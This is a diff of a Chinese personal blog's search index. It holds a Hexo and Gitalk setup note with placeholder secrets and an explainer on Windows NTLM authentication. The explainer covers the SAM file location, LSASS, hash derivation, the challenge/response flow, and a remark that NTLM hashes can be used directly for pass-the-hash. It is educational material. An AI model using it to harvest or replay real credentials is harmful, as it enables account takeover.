@@ -1,6 +1,57 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Blog Reference Link</title>
+    <url>/2019/06/14/Blog-Reference-Link/</url>
+    <content><![CDATA[<blockquote><p>恩 有点特别的信<br>但是<br>但这是……<br>世界上最纯粹最美丽的思念</p>
+<footer><strong>文伽</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep102379" target="_blank" rel="noopener">Bilibili《死后文》</a></cite></footer></blockquote>
+
+<a id="more"></a>
+<hr>
+<!-- ![68527244_p0.jpg](68527244_p0.jpg) -->
+<img src="/2019/06/14/Blog-Reference-Link/68527244_p0.jpg" width="600" height="600" title="68527244_p0.jpg">
+
+<br>
+
+<p>配置 Blog时参考的链接：</p>
+<ul>
+<li><a href="https://blog.csdn.net/u011475210/article/details/79023429" target="_blank" rel="noopener">从jekyll到hexo</a></li>
+<li><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">Hexo的Next主题详细配置</a></li>
+<li><a href="https://www.jianshu.com/p/1f8107a8778c" target="_blank" rel="noopener">hexo搭建个人博客–NexT主题优化</a></li>
+<li><a href="https://blog.csdn.net/u011054333/article/details/82718910" target="_blank" rel="noopener">在Hexo博客上添加可爱的Live2D模型</a></li>
+<li><a href="https://www.jianshu.com/p/baea8c95e39b" target="_blank" rel="noopener">Hexo添加字数统计、阅读时长</a></li>
+<li><a href="https://segmentfault.com/q/1010000017254914" target="_blank" rel="noopener">下载的hexo主题必须删掉.git</a></li>
+<li><a href="https://www.cnblogs.com/php-linux/p/8416116.html" target="_blank" rel="noopener">2个小时教你hexo博客添加评论、打赏…</a></li>
+<li><a href="https://blog.csdn.net/qq_36759224/article/details/82121420#font_colorFF000__Hexo__Github_font_155" target="_blank" rel="noopener">使用GithubPages和Hexo搭建自己…</a></li>
+<li><a href="https://hubojing.github.io/2016/04/06/%E5%B0%86hexo-github%E5%8D%9A%E5%AE%A2%E5%90%8C%E6%AD%A5%E6%89%98%E7%AE%A1%E8%87%B3coding/" target="_blank" rel="noopener">将hexo+github博客同步托管至coding</a></li>
+<li><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT使用文档</a></li>
+<li><a href="https://www.jianshu.com/p/2e318226c88d" target="_blank" rel="noopener">使用Hexo+Next主题搭建自己的个人博客</a></li>
+</ul>
+<br>
+
+<ul>
+<li><a href="https://iochen.com/2018/01/06/use-gitalk-in-hexo/" target="_blank" rel="noopener">Hexo中Gitalk配置使用教程</a></li>
+<li><a href="https://asdfv1929.github.io/2018/01/20/gitalk/" target="_blank" rel="noopener">Hexo NexT主题中集成gitalk评论系统</a></li>
+<li><a href="https://tyloafer.github.io/posts/7790/" target="_blank" rel="noopener">Hexo中引入Mermaid流程图</a></li>
+<li><a href="https://github.com/webappdevelp/hexo-filter-mermaid-diagrams" target="_blank" rel="noopener">hexo-filter-mermaid-diagrams</a></li>
+</ul>
+<hr>
+<blockquote>
+<p>配置 gitalk评论系统注意</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gitalk.swig </span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> gitalk = <span class="keyword">new</span> Gitalk(&#123;</span><br><span class="line">      clientID: <span class="string">'&#123;&#123; theme.gitalk.ClientID &#125;&#125;'</span>,   <span class="comment">// &lt;----</span></span><br><span class="line">      clientSecret: <span class="string">'&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;'</span>, <span class="comment">// &lt;----</span></span><br><span class="line">      repo: <span class="string">'&#123;&#123; theme.gitalk.repo &#125;&#125;'</span>,</span><br><span class="line">      owner: <span class="string">'&#123;&#123; theme.gitalk.githubID &#125;&#125;'</span>,</span><br><span class="line">      admin: [<span class="string">'&#123;&#123; theme.gitalk.adminUser &#125;&#125;'</span>],</span><br><span class="line">      id: location.pathname,</span><br><span class="line">      distractionFreeMode: <span class="string">'&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    gitalk.render(<span class="string">'gitalk-container'</span>)           </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">githubID:</span> <span class="string">evilH2O2</span>  </span><br><span class="line">  <span class="attr">repo:</span> <span class="string">gitalkComments</span>   </span><br><span class="line">  <span class="attr">ClientID:</span> <span class="string">xxxx</span>      <span class="comment"># &lt;---- 与上面对应，网上有版本不一样的 （ client_id )</span></span><br><span class="line">  <span class="attr">ClientSecret:</span> <span class="string">xxx</span>   <span class="comment"># &lt;---- 与上面对应</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">evilH2O2</span></span><br><span class="line">  <span class="attr">adminUser:</span> <span class="string">evilH2O2</span> </span><br><span class="line">  <span class="attr">distractionFreeMode:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>用 代码块(3个 `) + mermaid使用 Mermaid流程图</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ``3 mermaid</span></span><br><span class="line"><span class="comment"># graph LR </span></span><br><span class="line"><span class="comment">#   A --&gt; B</span></span><br><span class="line"><span class="comment"># ``3</span></span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Note</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Test Page</title>
     <url>/2019/06/12/Test-Page/</url>
     <content><![CDATA[<p>本页面用来进行测试</p>
@@ -89,57 +140,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Blog Reference Link</title>
-    <url>/2019/06/14/Blog-Reference-Link/</url>
-    <content><![CDATA[<blockquote><p>恩 有点特别的信<br>但是<br>但这是……<br>世界上最纯粹最美丽的思念</p>
-<footer><strong>文伽</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep102379" target="_blank" rel="noopener">Bilibili《死后文》</a></cite></footer></blockquote>
-
-<a id="more"></a>
-<hr>
-<!-- ![68527244_p0.jpg](68527244_p0.jpg) -->
-<img src="/2019/06/14/Blog-Reference-Link/68527244_p0.jpg" width="600" height="600" title="68527244_p0.jpg">
-
-<br>
-
-<p>配置 Blog时参考的链接：</p>
-<ul>
-<li><a href="https://blog.csdn.net/u011475210/article/details/79023429" target="_blank" rel="noopener">从jekyll到hexo</a></li>
-<li><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">Hexo的Next主题详细配置</a></li>
-<li><a href="https://www.jianshu.com/p/1f8107a8778c" target="_blank" rel="noopener">hexo搭建个人博客–NexT主题优化</a></li>
-<li><a href="https://blog.csdn.net/u011054333/article/details/82718910" target="_blank" rel="noopener">在Hexo博客上添加可爱的Live2D模型</a></li>
-<li><a href="https://www.jianshu.com/p/baea8c95e39b" target="_blank" rel="noopener">Hexo添加字数统计、阅读时长</a></li>
-<li><a href="https://segmentfault.com/q/1010000017254914" target="_blank" rel="noopener">下载的hexo主题必须删掉.git</a></li>
-<li><a href="https://www.cnblogs.com/php-linux/p/8416116.html" target="_blank" rel="noopener">2个小时教你hexo博客添加评论、打赏…</a></li>
-<li><a href="https://blog.csdn.net/qq_36759224/article/details/82121420#font_colorFF000__Hexo__Github_font_155" target="_blank" rel="noopener">使用GithubPages和Hexo搭建自己…</a></li>
-<li><a href="https://hubojing.github.io/2016/04/06/%E5%B0%86hexo-github%E5%8D%9A%E5%AE%A2%E5%90%8C%E6%AD%A5%E6%89%98%E7%AE%A1%E8%87%B3coding/" target="_blank" rel="noopener">将hexo+github博客同步托管至coding</a></li>
-<li><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT使用文档</a></li>
-<li><a href="https://www.jianshu.com/p/2e318226c88d" target="_blank" rel="noopener">使用Hexo+Next主题搭建自己的个人博客</a></li>
-</ul>
-<br>
-
-<ul>
-<li><a href="https://iochen.com/2018/01/06/use-gitalk-in-hexo/" target="_blank" rel="noopener">Hexo中Gitalk配置使用教程</a></li>
-<li><a href="https://asdfv1929.github.io/2018/01/20/gitalk/" target="_blank" rel="noopener">Hexo NexT主题中集成gitalk评论系统</a></li>
-<li><a href="https://tyloafer.github.io/posts/7790/" target="_blank" rel="noopener">Hexo中引入Mermaid流程图</a></li>
-<li><a href="https://github.com/webappdevelp/hexo-filter-mermaid-diagrams" target="_blank" rel="noopener">hexo-filter-mermaid-diagrams</a></li>
-</ul>
-<hr>
-<blockquote>
-<p>配置 gitalk评论系统注意</p>
-</blockquote>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gitalk.swig </span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> gitalk = <span class="keyword">new</span> Gitalk(&#123;</span><br><span class="line">      clientID: <span class="string">'&#123;&#123; theme.gitalk.ClientID &#125;&#125;'</span>,   <span class="comment">// &lt;----</span></span><br><span class="line">      clientSecret: <span class="string">'&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;'</span>, <span class="comment">// &lt;----</span></span><br><span class="line">      repo: <span class="string">'&#123;&#123; theme.gitalk.repo &#125;&#125;'</span>,</span><br><span class="line">      owner: <span class="string">'&#123;&#123; theme.gitalk.githubID &#125;&#125;'</span>,</span><br><span class="line">      admin: [<span class="string">'&#123;&#123; theme.gitalk.adminUser &#125;&#125;'</span>],</span><br><span class="line">      id: location.pathname,</span><br><span class="line">      distractionFreeMode: <span class="string">'&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    gitalk.render(<span class="string">'gitalk-container'</span>)           </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">githubID:</span> <span class="string">evilH2O2</span>  </span><br><span class="line">  <span class="attr">repo:</span> <span class="string">gitalkComments</span>   </span><br><span class="line">  <span class="attr">ClientID:</span> <span class="string">xxxx</span>      <span class="comment"># &lt;---- 与上面对应，网上有版本不一样的 （ client_id )</span></span><br><span class="line">  <span class="attr">ClientSecret:</span> <span class="string">xxx</span>   <span class="comment"># &lt;---- 与上面对应</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">evilH2O2</span></span><br><span class="line">  <span class="attr">adminUser:</span> <span class="string">evilH2O2</span> </span><br><span class="line">  <span class="attr">distractionFreeMode:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>用 代码块(3个 `) + mermaid使用 Mermaid流程图</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ``3 mermaid</span></span><br><span class="line"><span class="comment"># graph LR </span></span><br><span class="line"><span class="comment">#   A --&gt; B</span></span><br><span class="line"><span class="comment"># ``3</span></span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>Note</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ADB常用命令</title>
     <url>/2019/06/21/ADB%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<blockquote><p>摘下红花送伊人<br>红花似火绾青丝<br>红花啊红花，绾起伊人的青丝<br>伊人笑靥如花</p>
@@ -205,6 +205,150 @@
 ]]></content>
       <tags>
         <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows认证体系—NTLM认证</title>
+    <url>/2019/08/23/Windows%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94NTLM%E8%AE%A4%E8%AF%81/</url>
+    <content><![CDATA[<p>NTLM Hash与 NTLM的关系、NTLM网络认证流程</p>
+<a id="more"></a>
+
+<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><ul>
+<li><code>NTLM Hash</code> </li>
+<li><code>NTLM</code> </li>
+<li><code>LSASS</code> </li>
+<li><code>Net-NTLM hash</code> </li>
+</ul>
+<br>
+
+<p>关键词解释：</p>
+<ul>
+<li><code>NTLM Hash</code>：存储在<code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果</li>
+<li><code>Net-NTLM hash</code>：通常是指网络环境下 NTLM认证中的 Hash (下有说明)</li>
+<li><code>NTLM</code>：除 <code>Kerberos</code>之外的一种网络认证协议，只支持 Windows </li>
+<li><code>LSASS</code>：Windows系统的安全机制（系统进程）。用于本地安全和登陆策略 </li>
+</ul>
+<br>
+
+<h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><br>
+
+<p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p>
+<blockquote>
+<p>SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code> </p>
+</blockquote>
+<p>在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 <em><code>NTLM Hash</code>*，与  SAM数据库中的 *<code>NTLM Hash</code></em> 进行比较，从而实现认证</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure>
+
+<p>首先，用户注销、重启、锁屏后，操作系统会让 <code>winlogon</code>显示登录界面，也就是输入框，接收输入后，将密码交给 <code>lsass</code>进程，这个进程中会存一份明文密码，将明文密码加密成 <code>NTLM Hash</code>，对比 SAM数据库中的 Hash进行验证</p>
+<br>
+
+<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><br>
+
+<blockquote>
+<p>Hash，<strong><em>一种将任意长度的消息压缩到某一固定长度的消息摘要的函数</em></strong> 。—— <a href="https://baike.baidu.com/item/Hash/390310?fr=aladdin" target="_blank" rel="noopener">度娘百科</a>  </p>
+</blockquote>
+<p>通常意义上的 <code>NTLM Hash</code>指存储在 <code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH，并且通常存在于 <code>LSASS</code>进程中，便于 SSP（NTLM 安全支持提供程序）使用</p>
+<br>
+
+<h3 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM Hash的生成"></a>NTLM Hash的生成</h3><br>
+
+<ul>
+<li>用户密码：<code>susi2001</code></li>
+<li>首先，密码经过十六进制转为 <code>7375736932303031</code> </li>
+<li>将十六进制结果转为 Unicode格式 <code>73007500730069003200300030003100</code></li>
+<li>以 Hex（16进制）数据作 MD4加密 <code>ed3202726368f8e9fd23e78fbfac8c13</code> </li>
+</ul>
+<br>
+
+<blockquote>
+<p>MD4加密使用 <code>HashCalc</code> </p>
+</blockquote>
+<br>
+
+<h2 id="NTLM-和-NTLM-Hash"><a href="#NTLM-和-NTLM-Hash" class="headerlink" title="NTLM 和 NTLM Hash"></a>NTLM 和 NTLM Hash</h2><br>
+
+<p>NTLM 是一种网络认证协议，与 <code>NTLM Hash</code>的关系就是：<strong>NTLM网络认证协议是以 <code>NTLM Hash</code> 作为根本凭证进行认证的协议</strong></p>
+<br>
+
+<h2 id="NTLM网络认证机制"><a href="#NTLM网络认证机制" class="headerlink" title="NTLM网络认证机制"></a>NTLM网络认证机制</h2><br>
+
+<p>NTLM是一种基于质询/应答 （<em>Challenge/Response</em> ）消息交换模式的认证机制，常用于 <strong>工作组</strong>和<strong>域环境</strong>下<em>登录场景的身份认证</em></p>
+<br>
+
+<h3 id="NTLM-认证方式"><a href="#NTLM-认证方式" class="headerlink" title="NTLM 认证方式"></a>NTLM 认证方式</h3><br>
+
+<ul>
+<li><strong>交互式认证</strong> ：使用域账号登录到客户端；涉及两部分（客户端、域控）</li>
+<li><strong>非交互式认证</strong> ：在已经登陆 的客户端上使用 SSO 的方式访问一台服务器；涉及三部分（客户端、域控、服务器）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 非交互式场景</span></span><br><span class="line"></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:domain\xiaoming </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:xiaoming</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><br>
+
+<p>NTLM协议的认证过程有三步：</p>
+<ul>
+<li><strong>协商</strong>：主要用于确认双方协议版本（NTLMv1、NTLMv2等）</li>
+<li><strong>质询</strong>：质询/应答 （<em>Challenge/Response</em>）模式，用于消息交换</li>
+<li><strong>验证</strong>：验证身份合法性，通常由 Server端或 DC完成这个过程</li>
+</ul>
+<p>大致流程如下：</p>
+<ul>
+<li>使用用户名和密码尝试登录客户端</li>
+<li>客户端对密码进行哈希处理并缓存密码 hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
+<li>服务器生成一个 16字节的随机数，称为 <strong>质询</strong> (Challenge) 或随机数 (nonce.aspx)，并发送给客户端</li>
+<li>客户端使用缓存的 <strong><em>用户密码的 Hash</em></strong> 对此 <code>Challenge</code> 进行加密，加密结果为 <code>Response</code>（暂且叫做<code>Challenge1</code>），然后将结果发送给服务器</li>
+<li>服务器发送三项数据给域控制器：<ul>
+<li><code>User name</code></li>
+<li>发送给客户端的 <code>Challenge</code>（已加密） </li>
+<li>从客户端接收到的 <code>Response</code> </li>
+</ul>
+</li>
+<li>域控制器使用 <code>User name</code>从 AD中检索该用户密码的 <code>NTLM Hash</code>，并使用此 <code>NTLM Hash</code>来加密 <em><code>Challenge</code></em> ，然后把这个值和客户端计算的响应值（<code>Challenge1</code>）进行比较。如果它们相同，则验证成功</li>
+</ul>
+<blockquote>
+<p>经过 <code>NTLM Hash</code>加密 <code>Challenge</code>的结果在网络协议中称之为 <code>Net NTLM Hash</code> </p>
+</blockquote>
+<blockquote>
+<p>在以上流程中，用户的登录密码 Hash 即为 <code>NTLM Hash</code>，Response中则包含 <code>Net-NTLM Hash</code></p>
+</blockquote>
+<br>
+
+<h3 id="NTLM-v2"><a href="#NTLM-v2" class="headerlink" title="NTLM v2"></a>NTLM v2</h3><br>
+
+<blockquote>
+<p>NTLM version 2 (NTLMv2)是在 Windows NT 4.0 SP4中引入的（在 Windows 2000 中得到了本地支持），它通过加强协议来防止许多欺骗攻击，并增加服务器向客户机进行身份验证的能力，从而增强了 NTLM的安全性</p>
+</blockquote>
+<p><code>NTLM v1</code> 与 <code>NTLM v2</code> 最显著的区别就是 <code>Challenge</code> 与 <strong>加密算法</strong> 不同，共同点就是加密的原料都是 <code>NTLM Hash</code> ：</p>
+<ul>
+<li>Challenge：<ul>
+<li><code>v1</code>： 8-byte</li>
+<li><code>v2</code>：16-byte </li>
+</ul>
+</li>
+<li>Net NTLM Hash：<ul>
+<li><code>v1</code>：DES</li>
+<li><code>v2</code>： HMAC-MD5</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM</span></span><br><span class="line"></span><br><span class="line">C = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">K1 | K2 | K3 = NTLM-Hash | <span class="number">5</span>-bytes<span class="number">-0</span></span><br><span class="line">response = DES(K1,C) | DES(K2,C) | DES(K3,C)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM v2</span></span><br><span class="line"></span><br><span class="line">SC = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">CC = <span class="number">8</span>-byte client challenge, random</span><br><span class="line">CC* = (X, time, CC2, domain name)</span><br><span class="line">v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)</span><br><span class="line">LMv2 = HMAC-MD5(v2-Hash, SC, CC)</span><br><span class="line">NTv2 = HMAC-MD5(v2-Hash, SC, CC*)</span><br><span class="line">response = LMv2 | CC | NTv2 | CC*</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
+<li><a href="http://wikipedia.moesalih.com/NTLM" target="_blank" rel="noopener">NT LAN Manager</a></li>
+<li><a href="http://www.voidcn.com/article/p-voxshmho-sn.html" target="_blank" rel="noopener">NTLM 协议</a></li>
+<li><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>Windows</tag>
+        <tag>渗透测试</tag>
+        <tag>Security</tag>
       </tags>
   </entry>
   <entry>
@@ -611,152 +755,8 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
 </ul>
 ]]></content>
       <tags>
+        <tag>Security</tag>
         <tag>Web Security</tag>
-        <tag>Security</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows认证体系—NTLM认证</title>
-    <url>/2019/08/23/Windows%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94NTLM%E8%AE%A4%E8%AF%81/</url>
-    <content><![CDATA[<p>NTLM Hash与 NTLM的关系、NTLM网络认证流程</p>
-<a id="more"></a>
-
-<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><ul>
-<li><code>NTLM Hash</code> </li>
-<li><code>NTLM</code> </li>
-<li><code>LSASS</code> </li>
-<li><code>Net-NTLM hash</code> </li>
-</ul>
-<br>
-
-<p>关键词解释：</p>
-<ul>
-<li><code>NTLM Hash</code>：存储在<code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果</li>
-<li><code>Net-NTLM hash</code>：通常是指网络环境下 NTLM认证中的 Hash (下有说明)</li>
-<li><code>NTLM</code>：除 <code>Kerberos</code>之外的一种网络认证协议，只支持 Windows </li>
-<li><code>LSASS</code>：Windows系统的安全机制（系统进程）。用于本地安全和登陆策略 </li>
-</ul>
-<br>
-
-<h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><br>
-
-<p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p>
-<blockquote>
-<p>SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code> </p>
-</blockquote>
-<p>在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 <em><code>NTLM Hash</code>*，与  SAM数据库中的 *<code>NTLM Hash</code></em> 进行比较，从而实现认证</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure>
-
-<p>首先，用户注销、重启、锁屏后，操作系统会让 <code>winlogon</code>显示登录界面，也就是输入框，接收输入后，将密码交给 <code>lsass</code>进程，这个进程中会存一份明文密码，将明文密码加密成 <code>NTLM Hash</code>，对比 SAM数据库中的 Hash进行验证</p>
-<br>
-
-<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><br>
-
-<blockquote>
-<p>Hash，<strong><em>一种将任意长度的消息压缩到某一固定长度的消息摘要的函数</em></strong> 。—— <a href="https://baike.baidu.com/item/Hash/390310?fr=aladdin" target="_blank" rel="noopener">度娘百科</a>  </p>
-</blockquote>
-<p>通常意义上的 <code>NTLM Hash</code>指存储在 <code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH，并且通常存在于 <code>LSASS</code>进程中，便于 SSP（NTLM 安全支持提供程序）使用</p>
-<br>
-
-<h3 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM Hash的生成"></a>NTLM Hash的生成</h3><br>
-
-<ul>
-<li>用户密码：<code>susi2001</code></li>
-<li>首先，密码经过十六进制转为 <code>7375736932303031</code> </li>
-<li>将十六进制结果转为 Unicode格式 <code>73007500730069003200300030003100</code></li>
-<li>以 Hex（16进制）数据作 MD4加密 <code>ed3202726368f8e9fd23e78fbfac8c13</code> </li>
-</ul>
-<br>
-
-<blockquote>
-<p>MD4加密使用 <code>HashCalc</code> </p>
-</blockquote>
-<br>
-
-<h2 id="NTLM-和-NTLM-Hash"><a href="#NTLM-和-NTLM-Hash" class="headerlink" title="NTLM 和 NTLM Hash"></a>NTLM 和 NTLM Hash</h2><br>
-
-<p>NTLM 是一种网络认证协议，与 <code>NTLM Hash</code>的关系就是：<strong>NTLM网络认证协议是以 <code>NTLM Hash</code> 作为根本凭证进行认证的协议</strong></p>
-<br>
-
-<h2 id="NTLM网络认证机制"><a href="#NTLM网络认证机制" class="headerlink" title="NTLM网络认证机制"></a>NTLM网络认证机制</h2><br>
-
-<p>NTLM是一种基于质询/应答 （<em>Challenge/Response</em> ）消息交换模式的认证机制，常用于 <strong>工作组</strong>和<strong>域环境</strong>下<em>登录场景的身份认证</em></p>
-<br>
-
-<h3 id="NTLM-认证方式"><a href="#NTLM-认证方式" class="headerlink" title="NTLM 认证方式"></a>NTLM 认证方式</h3><br>
-
-<ul>
-<li><strong>交互式认证</strong> ：使用域账号登录到客户端；涉及两部分（客户端、域控）</li>
-<li><strong>非交互式认证</strong> ：在已经登陆 的客户端上使用 SSO 的方式访问一台服务器；涉及三部分（客户端、域控、服务器）</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 非交互式场景</span></span><br><span class="line"></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:domain\xiaoming </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:xiaoming</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><br>
-
-<p>NTLM协议的认证过程有三步：</p>
-<ul>
-<li><strong>协商</strong>：主要用于确认双方协议版本（NTLMv1、NTLMv2等）</li>
-<li><strong>质询</strong>：质询/应答 （<em>Challenge/Response</em>）模式，用于消息交换</li>
-<li><strong>验证</strong>：验证身份合法性，通常由 Server端或 DC完成这个过程</li>
-</ul>
-<p>大致流程如下：</p>
-<ul>
-<li>使用用户名和密码尝试登录客户端</li>
-<li>客户端对密码进行哈希处理并缓存密码 hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
-<li>服务器生成一个 16字节的随机数，称为 <strong>质询</strong> (Challenge) 或随机数 (nonce.aspx)，并发送给客户端</li>
-<li>客户端使用缓存的 <strong><em>用户密码的 Hash</em></strong> 对此 <code>Challenge</code> 进行加密，加密结果为 <code>Response</code>（暂且叫做<code>Challenge1</code>），然后将结果发送给服务器</li>
-<li>服务器发送三项数据给域控制器：<ul>
-<li><code>User name</code></li>
-<li>发送给客户端的 <code>Challenge</code>（已加密） </li>
-<li>从客户端接收到的 <code>Response</code> </li>
-</ul>
-</li>
-<li>域控制器使用 <code>User name</code>从 AD中检索该用户密码的 <code>NTLM Hash</code>，并使用此 <code>NTLM Hash</code>来加密 <em><code>Challenge</code></em> ，然后把这个值和客户端计算的响应值（<code>Challenge1</code>）进行比较。如果它们相同，则验证成功</li>
-</ul>
-<blockquote>
-<p>经过 <code>NTLM Hash</code>加密 <code>Challenge</code>的结果在网络协议中称之为 <code>Net NTLM Hash</code> </p>
-</blockquote>
-<blockquote>
-<p>在以上流程中，用户的登录密码 Hash 即为 <code>NTLM Hash</code>，Response中则包含 <code>Net-NTLM Hash</code></p>
-</blockquote>
-<br>
-
-<h3 id="NTLM-v2"><a href="#NTLM-v2" class="headerlink" title="NTLM v2"></a>NTLM v2</h3><br>
-
-<blockquote>
-<p>NTLM version 2 (NTLMv2)是在 Windows NT 4.0 SP4中引入的（在 Windows 2000 中得到了本地支持），它通过加强协议来防止许多欺骗攻击，并增加服务器向客户机进行身份验证的能力，从而增强了 NTLM的安全性</p>
-</blockquote>
-<p><code>NTLM v1</code> 与 <code>NTLM v2</code> 最显著的区别就是 <code>Challenge</code> 与 <strong>加密算法</strong> 不同，共同点就是加密的原料都是 <code>NTLM Hash</code> ：</p>
-<ul>
-<li>Challenge：<ul>
-<li><code>v1</code>： 8-byte</li>
-<li><code>v2</code>：16-byte </li>
-</ul>
-</li>
-<li>Net NTLM Hash：<ul>
-<li><code>v1</code>：DES</li>
-<li><code>v2</code>： HMAC-MD5</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM</span></span><br><span class="line"></span><br><span class="line">C = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">K1 | K2 | K3 = NTLM-Hash | <span class="number">5</span>-bytes<span class="number">-0</span></span><br><span class="line">response = DES(K1,C) | DES(K2,C) | DES(K3,C)</span><br></pre></td></tr></table></figure>
-
